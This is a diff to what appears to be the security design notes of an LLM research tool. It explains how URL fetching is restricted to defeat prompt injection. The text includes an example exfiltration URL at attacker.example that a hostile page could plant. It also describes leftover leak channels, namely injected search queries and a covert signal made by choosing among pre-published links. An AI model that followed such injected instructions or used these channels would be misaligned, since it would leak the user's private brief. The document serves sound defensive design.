@@ -95,18 +95,24 @@ live internet, a live search service or a live model.
    tested: a stage gets only the tools its recipe names (a call to any other name runs nothing), arguments
    are checked against the tool's schema, calls are bounded in count, time and result size, every call and
    result is journaled so a resumed run replays it, and what a tool returns is wrapped as untrusted text.
-   **`fetch_url` only reads an address the model was shown**: one in the stage's prompt (the author's own
-   brief) or in an earlier tool result of the same conversation (a search hit, or the final address of a
-   page already read), copied exactly. Without that, a hostile page could tell the model to fetch
-   `https://attacker.example/?d=<the author's idea>` and carry the brief out in the address; the URL policy
-   only stops private hosts, not data in a public address. The check is made by the runner before the
-   journal, so a refusal is not stored and cannot stick to a later permitted call. Page text is plain text,
-   so a link on a page is not a new address the model has been shown.
+   **`fetch_url` only reads an address the model was shown**, copied exactly. Without that, a hostile page
+   could tell the model to fetch `https://attacker.example/?d=<the author's idea>` and carry the brief out
+   in the address; the URL policy only stops private hosts, not data in a public address. What counts as
+   shown is built by the runner from structured pieces only: the stage's prompt (the author's own brief),
+   the link lines of an earlier successful search (not the titles, which some page wrote), and the
+   `Source:` header of an earlier successful fetch (the address finally read, not the page's text, even a
+   line of it that says `Source:`). Error messages never count, neither the runner's (which echo names the
+   model typed, so a call could launder an address into the evidence by naming an argument after it) nor a
+   tool's. A tool's output counts for nothing unless the tool says so. The check is made before the
+   journal, so a refusal is not stored and cannot stick to a later permitted call.
    **What remains:** a search query is chosen by the model and goes to the search service by design
    (a local SearXNG passes it to the public engines it uses; Brave receives it when it is the backup), so
    an injected page can still try to put brief text into a query. That channel is limited to 400
    characters a query and the tool-call limit, and it reaches a search service, not an attacker's
-   server; closing it would mean not searching with model-written queries. An injected page can also
+   server; closing it would mean not searching with model-written queries. **A second, slow channel:**
+   a page, or a result the search engine ranks, can pre-publish a menu of addresses (every address in a
+   result's links counts as shown), and an injected model can signal a few bits by which it picks. It is
+   limited to the tool-call limit and carries no free text; it is not closed. An injected page can also
    steer the research notes. It cannot reach a file or a private host, or call a tool the stage was not
    given. The notes it produces are untrusted input to the next stage in turn.
 3. **The damage is bounded by the budget.** Every call reserves its worst-case cost before it
